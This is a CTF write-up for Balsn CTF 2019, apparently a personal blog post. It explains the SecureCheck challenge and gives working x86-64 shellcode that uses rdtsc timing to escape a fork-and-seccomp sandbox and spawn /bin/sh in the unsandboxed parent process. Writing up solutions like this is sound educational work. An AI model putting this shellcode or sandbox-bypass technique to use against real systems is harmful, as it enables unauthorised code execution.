# Balsn CTF 2019

Balsn CTF was one of the most difficult games I played throughout this year. Due to my lack of pwning skills, I could only solve two challenges: KrazyNote and SecureCheck. I spent about 30 hours on KrazyNote, a linux kernel exploitation challenge. Since it is my first time solving a kernel pwnable in a decent CTF and I learned a lot from that challenge, I will publish a write-up in detail. 

## SecureCheck
It is a very simple challenge. The pseudocode of the challenge is this:

```c
int main() {
	int wstatus;
	void *sc = mmap(RWX);
	read(0, sc, 0x1000);

	pid_t pid = fork();
	if (pid) {
		wait(&wstatus);
		if (wait == 0) { clear_all_registers(); sc();}
	}

	else {
		install_seccomp();
		clear_all_registers(); sc();
	}

}
```

I analyzed the seccomp rules with [this](https://github.com/david942j/seccomp-tools), and it showed that I am allowed to execute only two system calls: exit and exit_group.
The cool thing is that if the exit status for the child is 0, the parent executes the shellcode as well, which is not sandboxed. We must find a way to distinguish parent and child.

There can be many ways. My first idea was to search for special data in the stack. Since the child has init_seccomp() called, seccomp filter is in its stack, unlike is parent. By searching the stack, the shellcode can check if it is being executed in the child process or not. Sadly, this is hard because the RSP pointer is zero'ed out. There are dirty tricks such as accessing the libc via relative addresses to RIP (mmap'ed pages are contiguos) and fetching a stack address in `environ`, but this was a libc dependent solution so I quickly gave up.

My solution was that, if we have a random number generator of any sort, we can distinguish the parent and child. Assuming we have a 0/1 single bit randomizer and there is a conditional jump depending on this random value, we can execute different code in the parent and child with about a chance of 1/4, which is realistic enough. My random source was the TSC register, the super-sensitive timestamp register. The `rdtsc` instruction saves the timestamp in EAX:EDX, so I can use the lowest bit of EAX as the random source. My shellcode code is the following:

```asm
rdtsc
mov rdx, 0xfffff
.randomTimeWaste:
	dec rdx
	cmp rdx, 0
	jne .randomTimeWaste

and rax, 1
cmp rax, 1
je .parent
.child:
	mov rax, 60
	mov rdi, 0
	syscall
.parent:
	mov rax, 59
	lea rdi, [rip+binshStr]
	mov rsi, 0
	mov rdx, 0
	syscall

binshStr: .string "/bin/sh"
```

At a chance of 1/4, the parent pops a shell which gives us the flag.

## KrazyNote

I have lots to talk about this challenge, so I wrote a blogpost about it.
[Check it out]() if you're curious.
